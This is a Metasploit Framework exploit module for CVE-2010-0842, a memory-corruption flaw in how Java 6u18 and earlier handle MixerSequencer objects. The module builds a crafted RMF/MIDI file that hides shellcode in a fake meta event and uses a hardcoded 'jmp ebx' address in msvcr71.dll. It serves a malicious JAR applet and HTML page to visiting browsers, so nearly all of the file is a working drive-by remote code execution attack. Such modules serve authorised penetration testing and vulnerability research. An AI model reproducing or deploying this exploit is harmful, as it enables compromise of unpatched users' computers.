##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Java MixerSequencer Object GM_Song Structure Handling Vulnerability",
      'Description'    => %q{
          This module exploits a flaw within the handling of MixerSequencer objects
        in Java 6u18 and before.

          Exploitation id done by supplying a specially crafted MIDI file within an RMF
        File. When the MixerSequencer objects is used to play the file, the GM_Song
        structure is populated with a function pointer provided by a SONG block in the
        RMF. A Midi block that contains a MIDI with a specially crafted controller event
        is used to trigger the vulnerability.

        When triggering the vulnerability "ebx" points to a fake event in the MIDI file
        which stores the shellcode. A "jmp ebx" from msvcr71.dll is used to make the
        exploit reliable over java updates.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Peter Vreugdenhil',  # Vulnerability Discovery and exploit
          'juan vazquez', # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2010-0842' ],
          [ 'OSVDB', '63493'],
          [ 'BID', '39077'],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-060/' ],
          [ 'URL', 'http://vreugdenhilresearch.nl/java-midi-parse-vulnerabilities/']
        ],
      'Payload'        =>
        {
          'Space'    => 8000,
        },
      'DefaultOptions'  =>
        {
          'EXITFUNC'             => "process",
          'InitialAutoRunScript' => 'migrate -f',
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [
            # Tested succesfully on:
            # Windows XP SP3 / IE 6 / Java 6u18
            # Windows XP SP3 / IE 7 / Java 6u18
            # Windows XP SP3 / IE 8 / Java 6u18
            # Windows XP SP3 / Firefox 7.0.1 / Java 6u18
            # Windows XP SP3 / IE 8 / Java 6u17
            # Windows XP SP3 / Firefox 7.0.1 / Java 6u17
            # Windows 7 / IE 8 / Java 6u18
            'Windows / Java 6 <=u18',
            {
              'Ret' => 0x7C35A78D # jmp ebx # msvcr71.dll
            }
          ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Mar 30 2010",
      'DefaultTarget'  => 0))

  end

  def get_rmf

    rmf_header = ""
    rmf_header << "IREZ" # RMFHeaderMagic
    rmf_header << "\x00\x00\x00\x01" # RMFVersionNumber
    rmf_header << "\x00\x00\x00\x02" # NumberOfRMFBlocks

    song_block = ""
    song_block << "\x00\x00\x00\x65" # OffsetToNextBlock
    song_block << "SONG" # BlockType
    song_block << [target.ret].pack("N") # BlockID
    song_block << "\x00" # BlockName
    song_block << "\x00\x00\x00\x47" # BlockDataSize
    song_block << "\x7F\xFF\x00\x01\x00\x00\x01\x01" # BlockData
    song_block << "\x00\x00\x00\x04\x00\x1C\x00\x08" # BlockData
    song_block << "\x00\x7F\x00\x00\x00\x00\x00\x00" # BlockData
    song_block << "\x00\x00\x00\x00\x00\x00\x00\x00" # BlockData
    song_block << "\x00\x00\x00\x00\x00\x00\x00\x00" # BlockData
    song_block << "\x00\x00\x00\x00\x00\x00\x00\x00" # BlockData
    song_block << "\x00\x01\x54\x49\x54\x4C\x9F\xB1" # BlockData
    song_block << "\xB5\x0D\x0A\x7E\xFB\x70\x9C\x86" # BlockData
    song_block << "\xFE\xB0\x35\x93\xE2\x5E\xDE\xF7" # BlockData

    midi = ""
    # HEADERCHUNK Header
    midi << "MThd"                 # Header
    midi << "\x00\x00\x00\x06"     # Chunk size
    midi << "\x00\x01"             # Format Type
    midi << "\x00\x01"             # Number of tracks
    midi << "\x00\x08"             # Time division
    # TRACKCHUNK header
    midi << "MTrk"                 # Header
    midi << "\x00\x00\x24\xd7" # Length
    midi << "\x00\xb0\x80\x00" # Controller Event # Triggers the vulnerability
    # Fake Midi Meta event - Shellcode
    midi << "\x38" # Variable lenght delta time
    midi << "\xff" # Midi meta event
    midi << "\x02" # Meta event type 02 => Copyright notice
    midi << "\xc9\x50" # Variable Meta Event Length
    midi << payload.encoded
    midi << rand_text(9123 - payload.encoded.length)

    midi_block = "\x00\x00\x25\x60" # OffsetToNextBlock
    midi_block << "Midi" # BlockType
    midi_block << "\x00\x00\x7f\xff" # BlockID
    midi_block << "\x00" # BlockName
    midi_block << "\x00\x00\x24\xed" # BlockDataSize
    midi_block << midi # BlockData

    rmf = ""
    rmf << rmf_header
    rmf << song_block
    rmf << midi_block

    rmf_name = "#{rand_text_alpha(rand(5) + 3)}.rmf"

    return rmf_name, rmf
  end

  def get_jar

    files = [
      [ "MyController.class" ],
      [ "MixerMidiApplet.class" ],
      [ "META-INF", "services", "javax.sound.midi.spi.MidiDeviceProvider" ]
    ]
    jar = Rex::Zip::Jar.new
    jar.add_file("META-INF/", "")
    jar.add_file("META-INF/services/", "")
    jar.add_files(files, File.join(Msf::Config.install_root, "data", "exploits", "CVE-2010-0842"))
    jar.build_manifest

    jar_name = "#{rand_text_alpha(rand(5) + 3)}.jar"

    return jar_name, jar
  end

  def on_request_uri(cli, request)

    if request.uri =~ /\.jar$/i
      print_status("Sending JAR file to #{cli.peerhost}:#{cli.peerport}...")
      send_response(cli, @jar.pack, {'Content-Type'=>'application/octet-strem'})
      return
    end

    if request.uri =~ /\.rmf$/i
      print_status("Sending RMF file to #{cli.peerhost}:#{cli.peerport}...")
      send_response(cli, @rmf, {'Content-Type'=>'application/octet-strem'})
      return
    end

    base_uri = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource
    rmf_uri = base_uri + "/#{@rmf_name}"
    jar_uri = base_uri + "/#{@jar_name}"

    html = %Q|
    <html>
    <head>
    </head>
    <body>
    <applet code="MixerMidiApplet.class" archive="#{jar_uri}" width=350 height=200>
      <param name="midifile" valuetype="ref" value="#{rmf_uri}">
    </applet>
    </body>
    </html>
    |

    html = html.gsub(/^\t\t/, '')

    print_status("Sending html to #{cli.peerhost}:#{cli.peerport}...")
    send_response(cli, html, {'Content-Type'=>'text/html'})
  end

  def exploit
    @jar_name, @jar = get_jar
    @rmf_name, @rmf = get_rmf
    super
  end

end
